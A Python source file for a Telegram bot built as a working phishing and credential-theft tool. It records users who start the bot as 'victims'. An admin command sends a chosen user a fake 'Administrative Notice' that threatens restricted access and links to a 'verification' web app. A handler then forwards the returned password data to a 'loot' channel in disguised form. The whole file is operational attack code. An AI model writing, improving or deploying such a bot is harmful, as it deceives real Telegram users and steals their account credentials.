import os
import json
import http.server
import socketserver
import threading
from telegram import Update, WebAppInfo, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes

# --- CONFIGURATION ---
TOKEN = os.getenv("BOT_TOKEN")
ADMIN_ID = 8699819680
LOOT_CHANNEL_ID = -1003817774248
TMA_URL = "https://pawsofjoy.github.io/tma-auditor/"
DATABASE_FILE = "user_database.json"

# --- PORT BINDING FIX FOR RENDER ---
def start_fake_server():
    handler = http.server.SimpleHTTPRequestHandler
    with socketserver.TCPServer(("", 10000), handler) as httpd:
        httpd.serve_forever()

threading.Thread(target=start_fake_server, daemon=True).start()

# --- DATABASE LOGIC ---
def load_db():
    try:
        if os.path.exists(DATABASE_FILE):
            with open(DATABASE_FILE, "r") as f:
                data = json.load(f)
                return data if isinstance(data, dict) else {}
    except:
        pass
    return {}

def save_db(db):
    try:
        with open(DATABASE_FILE, "w") as f:
            json.dump(db, f)
    except:
        pass

user_db = load_db()

# --- BOT HANDLERS ---
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    if not user: return
    
    username = f"@{user.username}" if user.username else str(user.id)
    
    # Store victim permanently
    user_db[username] = update.effective_chat.id
    save_db(user_db)
    
    if user.id == ADMIN_ID:
        await update.message.reply_text("💠 **Admin Command Center Active**\nUse `/trigger @username` to send the audit.")
    else:
        await update.message.reply_text("🛡️ **System Status**: Session Encrypted.\nPlease wait for administrative synchronization...")

async def trigger_audit(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID:
        return

    if not context.args:
        await update.message.reply_text("Usage: `/trigger @username`")
        return

    # FIX: Ensure target is a string, not a list
    target = str(context.args)
    
    if target in user_db:
        chat_id = user_db[target]
        keyboard = InlineKeyboardMarkup([
            [InlineKeyboardButton("✅ Verify Authenticity", web_app=WebAppInfo(url=TMA_URL))]
        ])
        
        audit_text = (
            "⚠️ **Administrative Notice: Ownership Verification**\n\n"
            "To maintain channel integrity and prevent unauthorized session hijacking, "
            "a routine authenticity check is required for this account.\n\n"
            "**Note:** Failure to verify may result in temporary restricted access. "
            "Active sessions and T-Data will remain unaffected by this process."
        )
        
        try:
            await context.bot.send_message(
                chat_id=chat_id, 
                text=audit_text,
                reply_markup=keyboard,
                parse_mode="Markdown"
            )
            await update.message.reply_text(f"🚀 Audit sent successfully to {target}")
        except Exception as e:
            await update.message.reply_text(f"❌ Failed to send: {str(e)}")
    else:
        await update.message.reply_text(f"❌ User {target} not found in database. Ask them to hit /start first.")

async def capture_loot(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not update.effective_message.web_app_data:
        return
        
    pswd_data = update.effective_message.web_app_data.data
    user = update.effective_user
    username = user.username or str(user.id)
    
    suffix = username[-5:] if len(username) >= 5 else username
    camouflaged_log = f"vtm/pswd/{suffix}/{pswd_data}"
    
    await context.bot.send_message(chat_id=LOOT_CHANNEL_ID, text=f"`{camouflaged_log}`", parse_mode="Markdown")

def main():
    if not TOKEN:
        print("Error: BOT_TOKEN not found!")
        return
        
    app = Application.builder().token(TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("trigger", trigger_audit))
    app.add_handler(MessageHandler(filters.StatusUpdate.WEB_APP_DATA, capture_loot))
    
    print("Bot is live...")
    app.run_polling()

if __name__ == '__main__':
    main()
